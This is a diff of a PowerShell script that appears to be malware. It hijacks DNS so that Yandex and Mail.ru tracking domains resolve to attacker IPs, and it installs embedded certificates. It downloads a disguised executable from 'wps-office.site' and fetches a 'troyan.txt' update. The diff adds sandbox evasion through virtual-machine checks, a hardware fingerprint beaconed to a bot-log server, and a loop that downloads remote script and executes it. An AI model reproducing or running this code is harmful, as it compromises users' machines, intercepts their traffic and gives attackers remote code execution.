@@ -1,42 +1,55 @@
 ﻿$server = '{
+    "tabs":  [
+                 {
+                     "id":  "default",
+                     "exeName":  "default",
+                     "pushes":  "https://yandex.ru https://yahoo.com",
+                     "startDownloads":  "http://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
+                     "startUrls":  "https://msn.com",
+                     "front":  "write.exe",
+                     "extractIconFromFront":  false,
+                     "embeddings":  ""
+                 }
+             ],
     "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
-    "updateUrl":  "http://109.248.201.226/d-data/troyan.txt",
-    "primaryDns":  "109.248.201.226",
-    "secondaryDns":  "109.248.201.224",
-    "track":  false,
+    "server":  "185.247.141.76",
+    "strahServer":  null,
+    "updateUrl":  "http://data-0.superhost.pw/d-data/troyan.txt",
+    "primaryDns":  "26.179.110.213",
+    "secondaryDns":  "185.247.141.78",
+    "track":  true,
     "trackSerie":  "001",
-    "trackingUrl":  "https://iplogger.com/2zDF55",
-    "trackingPost":  null,
-    "trackingMethod":  "GET",
-    "trackingPreview":  "https://iplogger.com:443/2zDF55?serie=%7bSERIE%7d\u0026number=%7bNUMBER%7d",
-    "trackingPreviewPost":  "{\r\n  \"serie\": \"{SERIE}\",\r\n  \"number\": \"{NUMBER}\"\r\n}",
-    "autoStart":  false,
-    "autoUpdate":  false,
+    "trackUrl":  "http://0.superhost.pw/api/botlog/upsert",
+    "autoStart":  true,
+    "autoUpdate":  true,
     "domains":  [
                     "mc.yandex.ru",
                     "mc.yandex.com",
                     "t.mail.ru",
                     "ad.mail.ru",
-                    "counter.yadro.ru"
+                    "counter.yadro.ru",
+                    "test.com"
                 ],
     "ipDomains":  {
-                      "109.248.201.226":  "mc.yandex.ru",
-                      "109.248.201.224":  "mc.yandex.com",
-                      "109.248.201.223":  "t.mail.ru",
-                      "109.248.201.222":  "ad.mail.ru",
-                      "109.248.201.220":  "counter.yadro.ru"
+                      "26.179.110.213":  "mc.yandex.ru",
+                      "185.247.141.78":  "mc.yandex.com",
+                      "185.247.141.51":  "t.mail.ru",
+                      "185.247.141.50":  "ad.mail.ru",
+                      "185.247.141.48":  "counter.yadro.ru",
+                      "185.247.141.46":  "test.com"
                   },
     "pushes":  [
-
+                   "https://yandex.ru",
+                   "https://yahoo.com"
                ],
     "startDownloads":  [
-
+                           "http://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
                        ],
     "startUrls":  [
-
+                      "https://msn.com"
                   ],
     "front":  [
-                  "ChromeSetup.exe"
+                  "write.exe"
               ],
     "embeddings":  [
 
@@ -141,6 +154,25 @@ $xdata = @{
 'XdnHLgkHwVt+dC4o+235yH34/sclTHDxSOMKUGT3doPDcSzcxrTug+D81EGz5L+UHtgrorvBtXLqdpstZ+OQ7NwTi5xCK7micagn2PeMmLj/rznVbhDwb547yDlxq+JTKJc3RTk1BEtq2bEzE51pQSjrVovYIkTRyMzSzw2J1vMoX6deDUPuT0/2eY4kZQjBA8x1MXD+'+ 
 'YpfCzSFYe+eBsbq6qPW/2qzURXtHeFyuy8HyRiEp24XKOnI+xCRxBl1BQw83J6Oakl1kMNWtvXmtPnRsCiGUV6/A48pcp1YruEen+Zmta+88Olm1J/KbpjIlWpDbzRqJSPUb1ir8U+/A7gIe3AaorLgQ17h7jZiCHZ0a9OR4wKKKY2+asu2eM33CJKMxtSyaevEwOzAf'+ 
 'MAcGBSsOAwIaBBSsjGg5jo3CAHOfh+WgqliHqEcCwQQUiThkTnc72R2ECYFslhTFTFn4LkwCAgfQ'
+'test.com'='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'+ 
+'pDLDKu+todz6BG7rOAICB9A='
 }
 
 function IsDebug {
@@ -1147,6 +1179,161 @@ function DoStartUrls {
 
 
 
+
+
+
+function Is-VirtualMachine {
+    # Get Win32_ComputerSystem information
+    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
+    $isVirtual = $false
+
+    # Check for common virtualization manufacturers
+    $vmManufacturers = @(
+        "Microsoft Corporation",   # Hyper-V
+        "VMware, Inc.",            # VMware
+        "Xen",                     # Xen
+        "XenSource, Inc.",         # XenSource
+        "innotek GmbH",            # VirtualBox
+        "Oracle Corporation",      # VirtualBox
+        "Parallels Software International Inc.", # Parallels
+        "QEMU",                    # QEMU
+        "Red Hat, Inc.",           # KVM
+        "Amazon EC2",              # AWS EC2
+        "Google",                  # Google Cloud Platform
+        "Virtuozzo",               # Virtuozzo
+        "DigitalOcean"             # DigitalOcean
+    )
+
+    # Check Manufacturer and Model for signs of virtualization
+    if ($vmManufacturers -contains $computerSystem.Manufacturer) {
+        $isVirtual = $true
+    } elseif ($computerSystem.Model -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
+        $isVirtual = $true
+    }
+
+    # Additional checks for virtualization using Win32_BIOS
+    $bios = Get-WmiObject -Class Win32_BIOS
+    if ($bios.SerialNumber -match "VMware|VBOX|Virtual|Xen|QEMU|Parallels") {
+        $isVirtual = $true
+    }
+
+    # Additional checks using Win32_ComputerSystemProduct
+    $computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct
+    if ($computerSystemProduct.Version -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
+        $isVirtual = $true
+    }
+
+    # Additional registry check for Parallels
+    $parallelsKey = "HKLM:\SOFTWARE\Parallels\Parallels Tools"
+    if (Test-Path $parallelsKey) {
+        $isVirtual = $true
+    }
+
+    return $isVirtual
+}
+
+
+function Get-MachineHashCode {
+    # Get BIOS Serial Number
+    $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
+
+    # Get Motherboard Serial Number
+    $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
+
+    # Get MAC Address of the first network adapter
+    $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
+
+    # Combine the hardware identifiers into a single string
+    $combinedString = "$biosSerial$mbSerial$macAddress"
+
+    # Compute the hash code using SHA256
+    $sha256 = [System.Security.Cryptography.SHA256]::Create()
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
+    $hashBytes = $sha256.ComputeHash($bytes)
+
+    # Convert the first 8 bytes of the hash to a 64-bit integer (long)
+    $longValue = [BitConverter]::ToInt64($hashBytes, 0)
+
+    # Ensure the value is positive by applying mask and adjustment
+    if ($longValue -lt 0) {
+        # Convert negative value to positive within UInt64 range
+        $unsignedLongValue = [System.UInt64]($longValue + [math]::Pow(2, 64))
+    } else {
+        # Directly cast to UInt64 if the value is already positive
+        $unsignedLongValue = [System.UInt64]$longValue
+    }
+
+    return $unsignedLongValue
+}
+
+function Generate-Hash {
+    param (
+        [string]$data,
+        [string]$key
+    )
+
+    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
+    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
+    
+    $hmac = New-Object System.Security.Cryptography.HMACSHA256
+    $hmac.Key = $keyBytes
+    $hashBytes = $hmac.ComputeHash($dataBytes)
+    
+    return [Convert]::ToBase64String($hashBytes)
+}
+
+
+function DoTrack {
+    if ($server.track -eq $false){
+        return
+    }
+
+    $isVM = Is-VirtualMachine
+    if ($isVM -eq $true){
+        return
+    }
+
+    $id = Get-MachineHashCode
+
+    $body = "{`"server`":`"$($server.server.ToString())`",`"id`":`"$($id.ToString())`",`"serie`":`"$($server.trackSerie.ToString())`",`"number`":`"$($id.ToString())`"}"
+
+
+    # Secret key (shared with the server)
+    $secretKey = "YourSecretKeyHere"
+
+    $url= $server.trackUrl
+  
+    # Generate the hash for the JSON request body
+    $hash = Generate-Hash -data $body -key $secretKey
+
+    # Prepare headers
+    $headers = @{
+        "X-Signature" = $hash
+        "Content-Type" = "application/json"
+        "User-Agent"  = "PowerShell/7.2"  # Use the User-Agent from Postman if known
+    }
+
+
+    # Make the POST request directly with parameters
+    try {
+        Invoke-WebRequest -Headers $headers -Method "POST" -Body $body -Uri $url -ContentType "application/json; charset=utf-8"
+    }
+    catch [System.Net.WebException] {
+        $statusCode = $_.Exception.Response.StatusCode
+        $respStream = $_.Exception.Response.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($respStream)
+        $reader.BaseStream.Position = 0
+        $responseBody = $reader.ReadToEnd() | ConvertFrom-Json
+            Write-Error "Error making request: $responseBody"
+    }
+    catch{
+            Write-Error "Error making request: $_"
+    }
+}
+
+
+
+
 function ConfigureYandex
 {
     Close-Processes(@('service_update.exe','browser.exe'))
@@ -1231,6 +1418,9 @@ function ConfigureYandexInternal {
 
 
 
+
+
+
 function main {
     ConfigureDnsServers
     ConfigureCertificates
@@ -1244,7 +1434,43 @@ function main {
     DoStartDownloads
     DoStartUrls
     LaunchChromePushes
+    DoTrack
 }
 
 main
+
+
+
+
+
+
+
+function DoExtraUpdate() {
+    if (-not $server.extraUpdate){
+        return
+    }
+    $timeout = [datetime]::UtcNow.AddMinutes(1)
+    $delay = 5
+
+    
+    while ([datetime]::UtcNow -lt $timeout) {
+        try {
+            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get
+
+            if ($response.StatusCode -eq 200) {
+                $scriptBlock = [ScriptBlock]::Create($response.Content)
+                . $scriptBlock
+                return
+            }
+        }
+        catch {
+            Write-Error "Failed to download or execute the script: $_"
+        }
+
+        Start-Sleep -Seconds $delay
+    }
+    Write-Error "Failed to download the script within the allotted time."
+}
+
+DoExtraUpdate
 
